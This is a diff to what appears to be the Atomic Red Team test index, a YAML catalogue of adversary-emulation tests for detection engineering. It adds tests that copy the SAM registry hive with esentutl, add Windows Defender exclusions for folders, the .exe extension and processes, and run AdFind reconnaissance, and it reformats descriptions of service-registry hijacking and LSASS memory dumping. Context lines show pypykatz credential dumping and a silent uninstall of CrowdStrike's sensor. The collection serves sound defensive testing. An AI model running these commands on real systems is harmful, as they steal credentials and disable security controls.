@@ -6422,9 +6422,9 @@ privilege-escalation:
     atomic_tests:
     - name: Service Registry Permissions Weakness
       auto_generated_guid: f7536d63-7fd4-466f-89da-7e48d550752a
-      description: Service registry permissions weakness check and then which can
-        lead to privilege escalation with ImagePath. eg. reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"
-        /v ImagePath /d "C:\temp\AtomicRedteam.exe"
+      description: "Service registry permissions weakness check and then which can
+        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
+        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -14508,9 +14508,9 @@ persistence:
     atomic_tests:
     - name: Service Registry Permissions Weakness
       auto_generated_guid: f7536d63-7fd4-466f-89da-7e48d550752a
-      description: Service registry permissions weakness check and then which can
-        lead to privilege escalation with ImagePath. eg. reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"
-        /v ImagePath /d "C:\temp\AtomicRedteam.exe"
+      description: "Service registry permissions weakness check and then which can
+        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
+        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -17922,9 +17922,12 @@ credential-access:
         elevation_required: true
     - name: Dump LSASS.exe Memory using direct system calls and API unhooking
       auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
-      description: |-
-        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. https://github.com/outflanknl/Dumpert https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/ Upon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.
-        If you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.
+      description: "The memory of lsass.exe is often dumped for offline credential
+        theft attacks. This can be achieved using direct system calls and API unhooking
+        in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon
+        successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf
+        you see a message saying \\\"The system cannot find the path specified.\\\",
+        try using the  get-prereq_commands to download the  tool first.\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -19342,6 +19345,33 @@ credential-access:
         get_prereq_command: pip3 install pypykatz
       executor:
         command: 'pypykatz live registry
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: esentutl.exe SAM copy
+      auto_generated_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
+      description: |
+        Copy the SAM hive using the esentutl.exe utility
+        This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path to the file to copy
+          type: Path
+          default: "%SystemRoot%/system32/config/SAM"
+        file_name:
+          description: Name of the copied file
+          type: String
+          default: SAM
+        copy_dest:
+          description: Destination of the copied file
+          type: String
+          default: "%windir%"
+      executor:
+        command: 'del #{copy_dest}\#{file_name} & esentutl.exe /y /vss #{file_path}
+          /d #{copy_dest}/#{file_name}
 
 '
         name: command_prompt
@@ -22775,6 +22805,72 @@ defense-evasion:
           "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath
           $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList
           -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
+        name: powershell
+        elevation_required: true
+    - name: Tamper with Windows Defender Evade Scanning -Folder
+      auto_generated_guid: 0b19f4ee-de90-4059-88cb-63c800c683ed
+      description: "Malware can exclude a specific path from being scanned and evading
+        detection. \nUpon successul execution, the file provided should be on the
+        list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        excluded_folder:
+          description: This folder will be excluded from scanning
+          type: String
+          default: C:\Temp
+      executor:
+        command: |-
+          $excludedpath= "#{excluded_folder}"
+          Add-MpPreference -ExclusionPath $excludedpath
+        cleanup_command: |
+          $excludedpath= "#{excluded_folder}"
+          Remove-MpPreference -ExclusionPath $excludedpath
+        name: powershell
+        elevation_required: true
+    - name: Tamper with Windows Defender Evade Scanning -Extension
+      auto_generated_guid: 315f4be6-2240-4552-b3e1-d1047f5eecea
+      description: "Malware can exclude specific extensions from being scanned and
+        evading detection. \nUpon successful execution, the extension(s) should be
+        on the list of excluded extensions.\nTo check the exclusion list using poweshell
+        \ (Get-MpPreference).ExclusionExtension.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        excluded_exts:
+          description: A list of extension to exclude from scanning
+          type: string
+          default: ".exe"
+      executor:
+        command: |-
+          $excludedExts= "#{excluded_exts}"
+          Add-MpPreference -ExclusionExtension  $excludedExts
+        cleanup_command: |
+          $excludedExts= "#{excluded_exts}"
+          Remove-MpPreference -ExclusionExtension  $excludedExts
+        name: powershell
+        elevation_required: true
+    - name: Tamper with Windows Defender Evade Scanning -Process
+      auto_generated_guid: a123ce6a-3916-45d6-ba9c-7d4081315c27
+      description: "Malware can exclude specific processes from being scanned and
+        evading detection.\nUpon successful execution, the process(es) should be on
+        the list of excluded processes. \nTo check the exclusion list using poweshell
+        \ (Get-MpPreference).ExclusionProcess.\"\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        excluded_process:
+          description: A list of processes to exclude from scanning
+          type: string
+          default: outlook.exe
+      executor:
+        command: |-
+          $excludedProcess = "#{excluded_process}"
+          Add-MpPreference -ExclusionProcess $excludedProcess
+        cleanup_command: |
+          $excludedProcess = "#{excluded_process}"
+          Remove-MpPreference -ExclusionProcess  $excludedProcess
         name: powershell
         elevation_required: true
   T1078.002:
@@ -30485,9 +30581,9 @@ defense-evasion:
     atomic_tests:
     - name: Service Registry Permissions Weakness
       auto_generated_guid: f7536d63-7fd4-466f-89da-7e48d550752a
-      description: Service registry permissions weakness check and then which can
-        lead to privilege escalation with ImagePath. eg. reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"
-        /v ImagePath /d "C:\temp\AtomicRedteam.exe"
+      description: "Service registry permissions weakness check and then which can
+        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
+        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -35564,6 +35660,20 @@ discovery:
           Remove-Item #{adrecon_path} -Force -ErrorAction Ignore | Out-Null
           Get-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match "^ADRecon-Report-"} | Remove-Item -Force -Recurse
         name: powershell
+    - name: Adfind -Listing password policy
+      auto_generated_guid: 736b4f53-f400-4c22-855d-1a6b5a551600
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
+      supported_platforms:
+      - windows
+      executor:
+        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -default -s base lockoutduration
+          lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength
+          pwdhistorylength pwdproperties
+
+'
+        name: powershell
   T1069.002:
     technique:
       external_references:
@@ -37291,8 +37401,9 @@ discovery:
         name: sh
     - name: Remote System Discovery - sweep
       auto_generated_guid: 96db2632-8417-4dbb-b8bb-a8b92ba391de
-      description: |-
+      description: |
         Identify remote systems via ping sweep.
+
         Upon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.
       supported_platforms:
       - linux
@@ -39650,7 +39761,7 @@ execution:
       - windows
       input_arguments:
         source_file:
-          description: Location of the CSharp source_file
+          description: Location of the CSharp source file to compile and execute
           type: Path
           default: PathToAtomicsFolder\T1106\src\CreateProcess.cs
         output_file:
